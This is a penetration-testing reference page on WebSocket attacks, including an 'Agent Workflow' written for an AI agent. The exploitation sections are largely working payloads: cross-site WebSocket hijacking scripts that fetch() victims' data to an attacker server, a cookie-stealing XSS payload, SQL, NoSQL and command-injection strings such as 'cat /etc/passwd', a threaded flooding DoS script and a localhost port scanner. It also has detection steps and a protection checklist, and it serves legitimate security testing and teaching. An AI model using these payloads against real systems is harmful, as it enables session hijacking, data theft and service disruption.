# WebSocket Attacks

> **Summary**: WebSocket attacks exploit weaknesses in WebSocket handshakes, authentication, authorization, and message handling to hijack connections, inject malicious payloads, or exfiltrate data through the persistent bidirectional communication channel.
> **Impact**: Cross-Site WebSocket Hijacking (session theft), injection attacks (XSS/SQLi) via message manipulation, unauthorized data access, denial of service.
> **Typical Severity**: Medium | High | Critical

## How WebSockets Work

WebSocket connections are initiated via an HTTP upgrade handshake, then maintained as a persistent, full-duplex TCP connection. Unlike regular HTTP, WebSocket allows both the server and client to send messages at any time without request-response pairing.

### Handshake Process

**Client request**:
```http
GET /ws HTTP/1.1
Host: <TARGET>
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: <BASE64_RANDOM_VALUE>
Cookie: session=<SESSION_TOKEN>
Origin: https://<ORIGIN>
```

**Server response**:
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: <COMPUTED_HASH>
```

Key observations:
- `Sec-WebSocket-Key` is for caching prevention, NOT authentication.
- Cookies are sent automatically during the handshake (like regular HTTP requests).
- The `Origin` header indicates where the request originated (critical for CSWSH).

## Detection

### Indicators

- WebSocket connections visible in browser DevTools (Network tab, WS filter)
- URLs using `ws://` or `wss://` protocol schemes
- JavaScript code using `new WebSocket()` constructor
- `Upgrade: websocket` and `Connection: Upgrade` headers in HTTP traffic
- Socket.IO usage indicated by `EIO=` query parameter
- Long-lived connections in proxy history (Burp Suite)

### Automated Detection

```bash
# STEWS -- discover, fingerprint, and find known WebSocket vulnerabilities
python3 STEWS-vuln-detect.py -u <TARGET_URL>

# Nuclei -- WebSocket specific templates
nuclei -u <TARGET_URL> -tags websocket -o <OUTPUT_FILE>

# websocat -- connect to a WebSocket endpoint for manual testing
websocat --insecure wss://<TARGET>:<PORT>/ws -v

# wscat -- Node.js based WebSocket client
wscat -c wss://<TARGET>/ws
```

### Manual Detection

1. Open browser DevTools, go to the Network tab, and filter by "WS".
2. Interact with the application and observe WebSocket connections being established.
3. Inspect the handshake request -- note the `Origin` header, cookies, and any authentication tokens.
4. Examine WebSocket messages for data format (JSON, XML, plain text) and structure.
5. Check if authentication is cookie-based only (vulnerable to CSWSH) or uses tokens in messages.
6. Test if the `Origin` header is validated by replaying the handshake with a different origin.

## Exploitation

### Prerequisites

- A WebSocket endpoint on the target application
- Understanding of the message protocol (format, expected fields)
- For CSWSH: victim must be authenticated and visit an attacker-controlled page

### 1. Cross-Site WebSocket Hijacking (CSWSH)

**How it works**: Similar to CSRF, but for WebSockets. If the WebSocket handshake authenticates solely via cookies without validating the `Origin` header or using CSRF tokens, an attacker's page can open a WebSocket connection to the target and interact as the victim.

**Requirements**:
- WebSocket authentication is cookie-based
- Cookies are accessible cross-site (`SameSite=None` or not set, and no third-party cookie blocking)
- Server does not validate the `Origin` header (or validation is bypassable)

**Steps**:
1. Identify that the WebSocket endpoint uses cookie-based authentication.
2. Verify that the `Origin` header is not validated (replay handshake with `Origin: https://attacker.com`).
3. Host the following PoC on your server and trick the victim into visiting it.
   - Success: The attacker's page receives WebSocket messages from the victim's authenticated session.

**PoC -- Data Exfiltration**:
```html
<script>
var ws = new WebSocket('wss://<TARGET>/ws');

ws.onopen = function() {
    // Send a command that triggers the server to return sensitive data
    ws.send('READY');
};

ws.onmessage = function(event) {
    // Exfiltrate received data to attacker server
    fetch('https://<ATTACKER_SERVER>/steal?data=' + encodeURIComponent(event.data), {mode: 'no-cors'});
};
</script>
```

**PoC -- Send Commands as Victim**:
```html
<script>
var ws = new WebSocket('wss://<TARGET>/ws');

ws.onopen = function() {
    // Perform actions as the authenticated victim
    ws.send(JSON.stringify({"action": "changeEmail", "email": "attacker@evil.com"}));
};

ws.onmessage = function(event) {
    fetch('https://<ATTACKER_SERVER>/log?resp=' + encodeURIComponent(event.data), {mode: 'no-cors'});
};
</script>
```

### 2. Message Manipulation (Injection Attacks)

WebSocket messages are often processed server-side without the same input validation applied to HTTP parameters. Test for standard injection vulnerabilities through WebSocket messages.

#### XSS via WebSocket

If WebSocket message content is reflected in the page (e.g., chat applications):
```json
{"message": "<img src=x onerror=alert(document.domain)>"}
{"message": "<script>document.location='https://<ATTACKER_SERVER>/steal?c='+document.cookie</script>"}
```
- Success: JavaScript executes in the context of other users viewing the reflected message.
- See: [XSS](xss.md)

#### SQL Injection via WebSocket

If WebSocket messages are used in database queries:
```json
{"user": "admin' OR '1'='1", "action": "lookup"}
{"id": "1 UNION SELECT username, password FROM users--"}
```
- Success: Database responds with additional data or authentication is bypassed.
- See: [SQLi](sqli.md)

#### Command Injection via WebSocket

```json
{"command": "ping", "target": "127.0.0.1; whoami"}
{"filename": "report.pdf; cat /etc/passwd"}
```
- Success: Server executes the injected OS command.
- See: [Command Injection](command-injection.md)

#### NoSQL Injection via WebSocket

```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
```
- See: [NoSQL](nosql.md)

### 3. Missing Authentication / Authorization

**Steps**:
1. Connect to the WebSocket endpoint without any cookies or tokens.
2. Send messages and observe if the server responds with data.
3. Test if you can access other users' data by manipulating user identifiers in messages.
   - Success: Access to functionality or data without proper authentication.

```bash
# Connect without authentication
websocat --insecure wss://<TARGET>/ws -v

# Send a message requesting sensitive data
{"action": "getProfile", "userId": "<VICTIM_ID>"}
```

### 4. Origin Validation Bypass

If the server checks the `Origin` header, try these bypasses:

```
# Subdomain of the target
Origin: https://evil.target.com

# Null origin (sandboxed iframe)
Origin: null

# Partial match bypass
Origin: https://target.com.attacker.com

# No Origin header (some clients/tools)
# Remove the Origin header entirely
```

For Gorilla WebSocket servers where `CheckOrigin` returns `true`:
```html
<script>
// Any page on the internet can connect
const ws = new WebSocket('ws://<TARGET>:<PORT>/api/v1/websocket');
ws.onmessage = (ev) => {
    fetch('https://<ATTACKER_SERVER>/steal?d=' + encodeURIComponent(ev.data), {mode: 'no-cors'});
};
</script>
```

### 5. WebSocket Smuggling

WebSocket smuggling exploits reverse proxy misconfigurations where the proxy believes a WebSocket connection has been established (even when it has not), allowing the attacker to access hidden endpoints behind the proxy.

**Steps**:
1. Send an upgrade request that the reverse proxy forwards but the backend rejects.
2. The proxy treats the connection as upgraded, but the backend processes it as regular HTTP.
3. Subsequent requests through this "tunnel" bypass proxy-level access controls.
   - Success: Access to internal endpoints that are blocked by the reverse proxy.

See: [Request Smuggling](request-smuggling.md)

### 6. DoS via WebSocket

#### Message Flooding
```python
import websocket
import threading

def flood():
    ws = websocket.WebSocket()
    ws.connect('wss://<TARGET>/ws')
    while True:
        ws.send('A' * 65536)

for _ in range(100):
    threading.Thread(target=flood).start()
```

#### Malformed Frame "Ping of Death"
Craft WebSocket frames with a declared payload length near `Integer.MAX_VALUE` but send no body. Servers that pre-allocate buffers based on the declared length may crash with OutOfMemoryError.

#### Connection Exhaustion
Open many WebSocket connections without closing them, exhausting the server's connection pool.

### 7. Localhost WebSocket Abuse (Desktop Applications)

Desktop applications that expose WebSocket interfaces on `127.0.0.1` are vulnerable because browsers do not enforce SOP on loopback sockets.

**Steps**:
1. Discover the local WebSocket port by scanning from JavaScript:
```javascript
async function findLocalWs(start = 20000, end = 36000) {
    for (let port = start; port <= end; port++) {
        await new Promise((resolve) => {
            const ws = new WebSocket('ws://127.0.0.1:' + port + '/');
            let settled = false;
            const finish = () => { if (!settled) { settled = true; resolve(); } };
            ws.onerror = ws.onclose = finish;
            ws.onopen = () => {
                console.log('Found on port ' + port);
                ws.close();
                finish();
            };
        });
    }
}
```
2. Once found, interact with the local service's RPC methods from any web page the victim visits.
3. Chain available methods to achieve RCE (e.g., launching processes with attacker-controlled arguments).
   - Success: Remote code execution on the victim's machine via their browser.

### 8. Server-Side Prototype Pollution via Socket.IO

If the application uses Socket.IO, test for prototype pollution:
```json
{"__proto__": {"initialPacket": "Polluted"}}
{"constructor": {"prototype": {"isAdmin": true}}}
```
- Success: Server behavior changes (e.g., new properties appear on objects, privilege escalation).
- See: [Prototype Pollution](prototype-pollution.md)

### 9. Race Conditions via WebSocket

WebSocket connections allow near-simultaneous message delivery, making them effective for triggering race conditions:
- Send multiple messages in rapid succession over parallel WebSocket connections.
- Target: double-spend, coupon reuse, state desync, token reuse.
- Use the Burp WebSocket Turbo Intruder extension with the THREADED engine for parallel delivery.
- See: [Race Conditions](race-conditions.md)

## Bypasses

### SameSite Cookie Bypass for CSWSH

- **SameSite=None**: Cookies are sent cross-site -- CSWSH works directly.
- **SameSite=Lax (default in Chrome)**: Cookies are NOT sent for WebSocket upgrades initiated cross-site. However, during the first 2 minutes after cookie creation, Chrome may treat `Lax` as `None`.
- **No SameSite attribute**: Defaults to `Lax` in modern Chrome, but older browsers may send cookies.
- **Localhost connections**: SameSite restrictions do not apply to loopback addresses -- CSWSH always works against `ws://127.0.0.1`.

### CSWSH via Subdomain

If the attacker can execute JavaScript on a subdomain of the target (e.g., via subdomain takeover or XSS on a subdomain):
- Cookies scoped to the parent domain are sent.
- The `Origin` may pass validation if the server allows subdomains.
- See: [Subdomain Takeover](subdomain-takeover.md)

## Escalation

- **CSWSH to Account Takeover**: Steal session data, change email/password via WebSocket commands. See: [Account Takeover](account-takeover.md)
- **WebSocket XSS to Cookie Theft**: Inject stored XSS through WebSocket messages in chat or notification features. See: [XSS](xss.md)
- **WebSocket SQLi to Data Exfiltration**: Extract database contents through SQL injection in WebSocket messages. See: [SQLi](sqli.md)
- **WebSocket Smuggling to Internal Access**: Bypass reverse proxy restrictions to reach hidden admin panels. See: [Request Smuggling](request-smuggling.md)
- **Localhost WebSocket to RCE**: Chain local WebSocket API methods to execute arbitrary commands on the victim's machine.
- **Prototype Pollution to RCE**: Server-side prototype pollution via Socket.IO can lead to RCE through gadget chains. See: [Prototype Pollution](prototype-pollution.md)

## Tools

| Tool | Usage |
|------|-------|
| [websocat](https://github.com/vi/websocat) | `websocat wss://<TARGET>/ws -v` -- CLI WebSocket client |
| [wscat](https://github.com/websockets/wscat) | `wscat -c wss://<TARGET>/ws` -- Node.js WebSocket client |
| [STEWS](https://github.com/PalindromeLabs/STEWS) | Discover, fingerprint, and find known WebSocket vulnerabilities |
| [Burp Suite](https://portswigger.net/burp) | WebSocket history, interception, repeater for WS messages |
| [socketsleuth](https://github.com/snyk/socketsleuth) | Burp extension: WS history, match/replace, Intruder, AutoRepeater |
| [WSSiP](https://github.com/nccgroup/wssip) | WebSocket/Socket.IO proxy for capture and injection |
| [wsrepl](https://github.com/doyensec/wsrepl) | Interactive WebSocket REPL for pentesting |
| [WebSocket Turbo Intruder](https://github.com/d0ge/WebSocketTurboIntruder) | High-volume WS fuzzing, race condition testing, HTTP middleware bridge |
| [Backslash Powered Scanner](https://github.com/PortSwigger/backslash-powered-scanner) | Burp extension with WebSocket message fuzzing support |
| [wshook](https://github.com/skepticfx/wshook) | JavaScript library to hook and intercept WebSocket messages |
| [PyCript](https://github.com/Anof-cyber/PyCript-WebSocket/) | Decrypt encrypted WebSocket traffic |
| [Hoppscotch](https://hoppscotch.io/realtime/websocket) | Web-based WebSocket client for quick testing |

## Socket.IO Specifics

Socket.IO adds its own framing on top of WebSocket. To interact with Socket.IO endpoints:

1. Detect via the `EIO` query parameter (e.g., `?EIO=4`).
2. Handshake: send `40` to initiate.
3. Keep-alive: respond to ping (`2`) with pong (`3`).
4. Events: use the `42["eventName", "data"]` format.
5. Example message sequence:
```
-> 40                         (connect)
<- 40{"sid":"..."}            (session id)
<- 2                          (ping)
-> 3                          (pong)
-> 42["message","hello"]      (emit event)
<- 42["response","world"]     (receive event)
```

## CSWSH Protection Checklist

When reporting, note which protections are missing:
- [ ] Origin header validation on WebSocket handshake
- [ ] Anti-CSRF token required during upgrade
- [ ] `SameSite=Strict` or `SameSite=Lax` on session cookies
- [ ] Authentication via message-level tokens (not just cookies)
- [ ] Rate limiting on WebSocket connections and messages

## Agent Workflow
> Step-by-step instructions for an AI agent to test for WebSocket vulnerabilities.

### Phase 1: Discovery
1. Browse the target application with browser DevTools open (Network tab, WS filter) and interact with all features to discover WebSocket connections.
2. Inspect JavaScript source for `new WebSocket()` constructors and `socket.io` usage:
   ```bash
   grep -rn 'new WebSocket\|\.connect(\|io(\|EIO=' <JS_FILES>
   ```
3. Note all discovered WebSocket endpoints (`ws://` or `wss://` URLs).
4. Capture the WebSocket handshake request -- record the `Origin` header, cookies, and any custom authentication headers or tokens.
5. Identify the message protocol: inspect sent/received messages for format (JSON, XML, plain text) and expected fields.
6. Check if Socket.IO is used (look for `EIO=` query parameter in the upgrade URL).

### Phase 2: Validation
1. **Test CSWSH (Cross-Site WebSocket Hijacking)**:
   - Replay the WebSocket handshake with `Origin: https://attacker.com` using `websocat` or a custom script.
   - If the server accepts the connection with a different origin, CSWSH is possible.
   - Check cookie attributes: `SameSite=None` or missing `SameSite` makes cross-site cookie sending possible.
2. **Test missing authentication**:
   - Connect to the WebSocket endpoint without any cookies or tokens:
     ```bash
     websocat --insecure wss://<TARGET>/<WS_PATH> -v
     ```
   - Send a message requesting data and observe if the server responds.
3. **Test origin validation bypass**:
   - Try `Origin: null` (sandboxed iframe).
   - Try `Origin: https://evil.<TARGET_DOMAIN>` (subdomain).
   - Try `Origin: https://<TARGET_DOMAIN>.attacker.com` (partial match).
   - Remove the `Origin` header entirely.

### Phase 3: Exploitation
1. **CSWSH exploitation**: If origin validation is missing/bypassable, create an attacker page that opens a WebSocket to the target and exfiltrates messages:
   ```html
   <script>
   var ws = new WebSocket('wss://<TARGET>/<WS_PATH>');
   ws.onopen = function() { ws.send('READY'); };
   ws.onmessage = function(e) { fetch('https://<ATTACKER_SERVER>/steal?d=' + encodeURIComponent(e.data)); };
   </script>
   ```
2. **Injection via WebSocket messages**: Send payloads through WebSocket messages:
   - XSS: `{"message": "<img src=x onerror=alert(document.domain)>"}`
   - SQLi: `{"user": "admin' OR '1'='1"}`
   - Command injection: `{"target": "127.0.0.1; whoami"}`
3. **Missing auth exploitation**: Access other users' data by manipulating user IDs in messages:
   ```json
   {"action": "getProfile", "userId": "<VICTIM_ID>"}
   ```
4. **WebSocket smuggling**: If a reverse proxy is in front, send an upgrade request that the proxy forwards but the backend rejects, then tunnel HTTP requests through the "WebSocket" connection to access restricted endpoints.

### Phase 4: Escalation
1. **CSWSH to account takeover**: Use the hijacked session to send state-changing commands (change email, change password) as the victim.
2. **XSS via WebSocket to cookie theft**: If messages are reflected in the DOM (chat, notifications), inject stored XSS payloads to steal sessions from other users.
3. **SQLi via WebSocket to data exfiltration**: Dump database contents through SQL injection in WebSocket message parameters.
4. **Localhost WebSocket abuse**: If a desktop application exposes a local WebSocket API, scan for the port and chain available RPC methods for RCE.
5. **Prototype pollution via Socket.IO**: Send `{"__proto__":{"isAdmin":true}}` to pollute server-side prototypes for privilege escalation.

## Decision Tree

```
Start: Identify WebSocket endpoints
  |
  +---> Origin validation on handshake?
  |       +---> No validation: CSWSH (hijack authenticated session)
  |       +---> Weak validation: Try bypass (subdomain, null, partial match)
  |       +---> Strong validation: Move to message-level attacks
  |
  +---> Message-level attacks
  |       +---> Messages reflected in DOM? --> XSS injection
  |       +---> Messages used in DB queries? --> SQLi / NoSQLi
  |       +---> Messages trigger OS commands? --> Command injection
  |
  +---> Authentication missing?
  |       +---> Connect without creds --> Access data / perform actions
  |
  +---> Reverse proxy in front?
          +---> WebSocket smuggling --> Access hidden endpoints
```

## Success Criteria
- [ ] WebSocket endpoint identified and message protocol understood
- [ ] CSWSH confirmed: attacker page successfully opens authenticated WebSocket and receives victim's data
- [ ] Injection payload (XSS, SQLi, or command injection) executes via WebSocket message
- [ ] Unauthorized actions performed as victim via hijacked WebSocket session
- [ ] If applicable: internal endpoints accessed via WebSocket smuggling

## References

- https://portswigger.net/web-security/websockets
- https://book.hacktricks.wiki/en/pentesting-web/websocket-attacks.html
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
- https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc
- https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/
- https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine
- https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/
- https://elliott.diy/blog/curseforge/ (WebSocket to RCE via local desktop app)
